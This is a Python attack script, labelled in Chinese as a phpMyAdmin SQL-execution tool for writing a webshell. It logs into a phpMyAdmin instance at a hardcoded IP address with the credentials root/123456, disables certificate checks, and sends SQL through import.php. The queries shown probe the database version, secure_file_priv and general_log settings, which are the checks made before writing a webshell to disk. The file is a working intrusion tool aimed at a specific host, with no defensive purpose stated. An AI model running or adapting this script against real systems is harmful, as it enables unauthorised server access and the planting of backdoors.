#!/usr/bin/env python3
"""phpMyAdmin SQL执行 - 写webshell"""
import urllib.request, http.cookiejar, ssl, re, sys, time

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
B = "http://124.71.142.158:9096/phpmyadmin"

cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), urllib.request.HTTPSHandler(context=ctx))
op.addheaders = [("User-Agent","Mozilla/5.0")]

def login():
    r = op.open(f"{B}/", timeout=10)
    html = r.read().decode("utf-8","ignore")
    token = re.search(r'name="token" value="([a-f0-9]{32})"', html).group(1)
    data = f"pma_username=root&pma_password=123456&server=1&token={token}".encode()
    op.open(urllib.request.Request(f"{B}/index.php", data=data), timeout=10).read()
    # 验证登录
    r = op.open(f"{B}/index.php", timeout=10)
    body = r.read().decode("utf-8","ignore")
    return "logout" in body or "navigation" in body

def exec_sql(sql, db=None):
    # 获取token
    r = op.open(f"{B}/index.php", timeout=10)
    html = r.read().decode("utf-8","ignore")
    token = re.search(r'name="token" value="([a-f0-9]{32})"', html)
    token = token.group(1) if token else ""
    data = {
        "token": token,
        "sql_query": sql,
        "db": db or "mysql",
        "server": "1",
        "ajax_request": "true",
    }
    import urllib.parse
    body = urllib.parse.urlencode(data).encode()
    try:
        r = op.open(urllib.request.Request(f"{B}/import.php", data=body), timeout=15)
        resp = r.read().decode("utf-8","ignore")
        return resp[:300]
    except Exception as e:
        return f"ERR:{str(e)[:60]}"

if login():
    print("登录成功", flush=True)
    # 1. 测试基本查询
    print("查询测试:", exec_sql("SELECT VERSION();", "mysql")[:150], flush=True)
    # 2. 检查secure_file_priv
    print("secure_file_priv:", exec_sql("SHOW VARIABLES LIKE 'secure_file_priv';", "mysql")[:200], flush=True)
    # 3. 检查general_log
    print("general_log:", exec_sql("SHOW VARIABLES LIKE 'general_log%';", "mysql")[:200], flush=True)
else:
    print("登录失败", flush=True)
